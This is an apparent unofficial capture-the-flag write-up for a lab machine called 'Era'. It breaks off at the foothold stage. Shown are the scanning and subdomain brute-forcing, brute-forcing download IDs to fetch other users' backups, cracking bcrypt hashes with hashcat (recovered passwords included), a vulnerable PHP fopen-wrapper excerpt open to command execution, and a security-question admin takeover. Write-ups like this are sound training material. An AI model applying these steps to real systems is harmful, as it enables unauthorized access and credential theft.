# Era

<table>
  <tr>
    <td>
      <img width="150" height="150" alt="EraIcon" src="https://github.com/user-attachments/assets/3191c775-b6b9-4095-8468-ece6e3096285" />
    </td>
    <td style="vertical-align: center; padding-left: 5rem;">
      <strong>Machine Difficulty:</strong> Medium <br />
      <strong>Creator:</strong> yurivich <br />
      <u><strong>Unofficial Writeup by HeadMonitor</strong></u>
    </td>
  </tr>
</table>

## Enumeration

We scan the machine with Nmap and find 2 open ports, one **ftp** and one **http**.

```bash
nmap -sC -sV ${MACHINE_IP}

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-30 19:13 UTC
Nmap scan report for 10.129.58.101
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.04 seconds
```
<br/>

We cannot use **ftp** with an anonymous user, as it is disabled.

```bash
ftp ${MACHINE_IP}

Connected to ${MACHINE_IP}
220 (vsFTPd 3.0.5)

Name (${MACHINE_IP}:user): anonymous
331 Please specify the password.
Password:

530 Login incorrect.
ftp: Login failed
```

So we will proceed to the website.

## Website
By putting the machine IP on our browser, we are redirected to `http://era.htb`. Since this isn't a real domain, we must add it to our `/etc/hosts` file.

```bash
sudo nano /etc/hosts

${MACHINE_IP} era.htb
```
<br/>

Upon inspection we do not see anything interesting on the site.

<img width="1920" height="901" alt="image" src="https://github.com/user-attachments/assets/3ed281fb-e6fd-4192-80da-c0e388657659" />
<br/>
<br/>

If we search for Subdomains by Bruteforcing, we will find `http://file.era.htb`.

```bash
ffuf -u http://era.htb/ -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: http://FUZZ.era.htb/"
```
<br/>

We also need to add this to our `/etc/hosts` file.

```bash
sudo nano /etc/hosts

${MACHINE_IP} era.htb
${MACHINE_IP} file.era.htb
```
<br/>

## File Upload Service
We found a file upload service.

<img width="1920" height="901" alt="image" src="https://github.com/user-attachments/assets/96e4b761-5393-4882-bfe8-a9819da10792" />
<br/>

If we click login we are redirected to `http://file.era.htb/login.php`. If we instead change it `http://file.era.htb/register.php` we can register a new user and login.

If we upload any file, we can get a link to download that file `http://file.era.htb/download.php?id=${ID}`

<img width="1920" height="901" alt="image" src="https://github.com/user-attachments/assets/96e4b761-5393-4882-bfe8-a9819da10792" />
<br>

We can Bruteforce the `id=` field to see if we can access any other files. We will create temporary `ids.txt` file with numbers from 1 to 1000, then use it as a wordslist. We will also need our account's cookie as to see downloaded files you need to be logged in. Finally we need to filter by text "File Not Found" as the website doesn't change respond code.

```bash
seq 1 1000 > ids.txt && 
fuf -u http://file.era.htb/download.php?id=FUZZ -w ids.txt -fr "File Not Found" -H "Cookie: PHPSESSID=${COOKIE}$" && 
rm ids.txt

54  [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 68ms]
150 [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 62ms]
```
<br/>

## Downloaded Files

We found 2 Files that anyone that is logged in can access. We can go ahead and Download them. We got `site-backup-30-08-24.zip` and `signing.zip`. We will need `signing.zip` later so keep that asside. It contains `key.pem` and `x509.genkey` files.

Upon inspecting `site-backup-30-08-24.zip` we find 2 interesting files, `download.php` and `filedb.sqlite`.

### filedb.sqlite

If we inspect `filedb.sqlite` we find some User Credentials on the `users` table.

<img width="1920" height="901" alt="image" src="https://github.com/user-attachments/assets/96e4b761-5393-4882-bfe8-a9819da10792" />
<br>

Let's try to Decrypt the Password Hashes. First we need to put all the hashes in a file (One Hash per line). Then we can use **hashcat** to try to Decrypt them.

```bash
hashcat -m 3200 hashes.txt SecLists/Passwords/Leaked-Databases/rockyou-75.txt

$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang
```
<br/>

We found the password for 2 users, `eric` with password `america` and `yuri` with password `mustang`. Upon login to the File Upload Service we don't see anything interesting as these accounts are normal users just like ours. We can also login with `yuri` on the FTP service but we do not see anything interesting there either. Only other interesting thing we found, is the Username of the Admin user, `admin_ef01cab31aa`, but we could not crack the password.

### download.php

Lets inspect the `download.php` file. We can see the following interesting commented code.

```php
// Allow immediate file download
	if ($_GET['dl'] === "true") {

		header('Content-Type: application/octet-stream');
		header("Content-Transfer-Encoding: Binary");
		header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
		readfile($fetched[0]);
	// BETA (Currently only available to the admin) - Showcase file instead of downloading it
	} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    		$format = isset($_GET['format']) ? $_GET['format'] : '';
    		$file = $fetched[0];

		if (strpos($format, '://') !== false) {
        		$wrapper = $format;
        		header('Content-Type: application/octet-stream');
    		} else {
        		$wrapper = '';
        		header('Content-Type: text/html');
    		}

    		try {
        		$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
			$full_path = $wrapper ? $wrapper . $file : $file;
			// Debug Output
			echo "Opening: " . $full_path . "\n";
        		echo $file_content;
    		} catch (Exception $e) {
        		echo "Error reading file: " . $e->getMessage();
    		}


	// Allow simple download
	} else {
		echo deliverTop("Era - Download");
		echo deliverMiddle_download("Your Download Is Ready!", $fileName, '<a href="download.php?id='.$_GET['id'].'&dl=true"><i class="fa fa-download fa-5x"></i></a>');

	}
```
<br/>

We notice a BETA Feature that is only available to the Admin. We notice that the code is vulnerable to SSRF as it uses `fopen` and a `wrapper`. We could use `format=ssh2.exec://` wrapper to run commands on the server. To do this though we need to be an Admin. If we inspect the Website further we can see that the Update Security Question feature can change the questions for any user. And just like that we can change the questions for `admin_ef01cab31aa` and login as them.

<img width="1920" height="901" alt="image" src="https://github.com/user-attachments/assets/96e4b761-5393-4882-bfe8-a9819da10792" />
<br>

## Foothold

To 